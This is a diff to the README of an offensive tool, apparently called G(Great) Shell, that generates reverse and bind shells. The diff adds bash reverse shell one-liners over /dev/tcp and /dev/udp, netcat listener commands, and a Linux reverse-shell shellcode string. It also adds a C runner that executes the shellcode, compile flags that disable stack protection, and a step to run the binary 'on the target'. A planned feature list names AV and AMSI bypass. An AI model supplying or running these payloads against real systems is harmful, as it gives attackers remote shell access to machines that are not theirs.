@@ -5,7 +5,7 @@
 
 A simple yet flexible cross-platform shell generator tool.
 
-Name: G(Great) Shell
+> Name: G(Great) Shell
 
 Description: A cross-platform shell generator tool that lets you generate whichever shell you want, in any system you want, giving you full control and automation.
 
@@ -83,13 +83,22 @@ shells/reverse_shells.md
 
 These can be one-liners and multi-liners, it doesn't matter. You can even add C# multi-liners code blocks if you want.
 
-Example, replace the IP address and the port placeholders or variables values with these placeholders in your code:
+Here is a reverse shell example command:
 
 ```bash
-$ip, $port
+bash -i >& /dev/tcp/192.168.10.11/433 0>&1
 ```
 
-That's it, now you can add more.
+To add another shell simply replace the IP address and the port placeholders or variables values with these placeholders in your code or command:
+
+- `$ip`: IP address
+- `$port`: Port number
+
+Here is an example:
+
+```
+bash -i >& /dev/tcp/$ip/$port 0>&1
+```
 
 > Note: It also offers advice and tips for performing and troubleshooting attacks.
 
@@ -98,18 +107,18 @@ That's it, now you can add more.
 This is the help menu:
 
 ```powershell
-PS C:\gshell> python .\gshell.py -h                                    
-usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--base64] [--base32] [--base16] [--url] [--no-block] [-l] [-a] [-h]
+PS C:\gshell> python .\gshell.py -h                                            
+usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--shellcode] [-t, <Target OS>] [--base64] [--base32] [--base16] [--url] [--no-block] [-l] [-a] [-h]
 
- ██████  ███████ ██   ██ ███████ ██      ██
-██       ██      ██   ██ ██      ██      ██
-██   ███ ███████ ███████ █████   ██      ██
-██    ██      ██ ██   ██ ██      ██      ██
- ██████  ███████ ██   ██ ███████ ███████ ███████
+ ██████  ███████ ██   ██ ███████ ██      ██      
+██       ██      ██   ██ ██      ██      ██      
+██   ███ ███████ ███████ █████   ██      ██      
+██    ██      ██ ██   ██ ██      ██      ██      
+ ██████  ███████ ██   ██ ███████ ███████ ███████ 
 
-Generate bind shells and/or reverse shells with style
+Generate shellcodes, bind shells and/or reverse shells with style
 
-            Version: 1.1
+            Version: 1.2
             Author: nozerobit
             Twitter: @nozerobit
 
@@ -129,6 +138,11 @@ Snippets Types:
   --hollowing           Print process hollowing code snippets
   --injector            Print process injector code snippets
 
+Shellcode Options:
+  --shellcode           Generate reverse shell shellcodes, requires --target as well
+  -t, <Target OS>, --target <Target OS>
+                        Shellcode for a specific operating system (Windows or Linux)
+
 Encoding Options:
   --base64              Add base64 encoding
   --base32              Add base32 encoding
@@ -146,6 +160,38 @@ Help Options:
   -a, --advice          Print advice and tips to get connections
   -h, --help            Show this help message and exit
 ```
+
+## Example of Listeners and Connectors
+
+Connect with [nc](https://linux.die.net/man/1/nc) TCP:
+
+```sh
+nc -v <IP> <PORT>
+```
+
+Connect with [nc](https://linux.die.net/man/1/nc) UDP:
+
+```sh
+nc -vu <IP> <PORT>
+```
+
+> Note: Replace `<IP>` with the IP address of the target and replace `<PORT>` with the target port number.
+
+Setup a listener with [nc](https://linux.die.net/man/1/nc) TCP:
+
+```sh
+nc -vlp <PORT>
+```
+
+Setup a listener with [nc](https://linux.die.net/man/1/nc) UDP:
+
+```sh
+nc -vulp <PORT>
+```
+
+> Note: Replace `<PORT>` with the port number of the target.
+
+## Example of Bind Shells & Reverse Shells
 
 Example, generate bash reverse shells:
 
@@ -174,6 +220,8 @@ bash -i >& /dev/tcp/192.168.111.120/443 0>&1
 
 bash -i >& /dev/udp/192.168.111.120/443 0>&1
 ```
+
+## Example of Encodings
 
 Here is an example of an encoding:
 
@@ -205,6 +253,55 @@ bash+-i+%3E%26+%2Fdev%2Fudp%2F192.168.111.120%2F443+0%3E%261
 
 ----------------NEXT CODE BLOCK----------------
 
+```
+
+## Example of Shellcodes
+
+Here is an example of a shellcode:
+
+```sh
+PS C:\gshell> python .\gshell.py -i 192.168.220.131 -p 4433 --shellcode --srev --linux
+[+] The IPv4 address: 192.168.220.131 is valid.
+[+] The port number: 4433 is valid.
+[+] Generating reverse shell shellcodes
+[+] Generating Linux shellcodes
+\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\x1\x1\x1\x1\xbb\xc1\xa9\xdd\x82\x31\xc3\x53\x66\x68\x11\x51\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
+```
+
+We could use the generate shellcode in another program or script:
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+int main(void)
+{
+    unsigned char code[] = "SHELLCODE_HERE";
+    printf("The shellcode length is: %d\n", strlen(code));
+    void (*s)() = (void *)code;
+    s();
+    return 0;
+}
+```
+
+Install 32-bit headers and libraries:
+
+```sh
+sudo apt-get install gcc-multilib
+```
+
+As an example we could compile the code above:
+
+```sh
+gcc -m32 -fno-stack-protector -z execstack example.c -o example
+```
+
+> More information about gcc compilation can be [found here](https://stackoverflow.com/questions/54082459/fatal-error-bits-libc-header-start-h-no-such-file-or-directory-while-compili).
+
+Run the `example` program on the target to receive the reverse shell:
+
+```sh
+chmod +x ./example && ./example
 ```
 
 # Installation in Linux
@@ -284,7 +381,7 @@ python gshell.py
 
 # Contact & Contributing
 
-If you find any issues then you can open an issue, contact me on [twitter](https://twitter.com/nozerobit) or [discord (preferred)](https://discord.gg/jChyJgGs7Z). 
+If you find any issues then you can open an issue or contact me on [twitter](https://twitter.com/nozerobit).
 
 If you want to contribute then please feel free.
 
@@ -292,9 +389,8 @@ Any feedback is appreciated.
 
 # ToDo
 
-For the version 2.0 which should have the following:
+The version 2.0 should have the following:
 
 1. Encryptors: To bypass AVs
 2. Obfuscators: To bypass AVs
 3. Anti-AMSI: To bypass AMSI
-4. Shellcode Generator: For shellcode runners, binary explitation, etc.
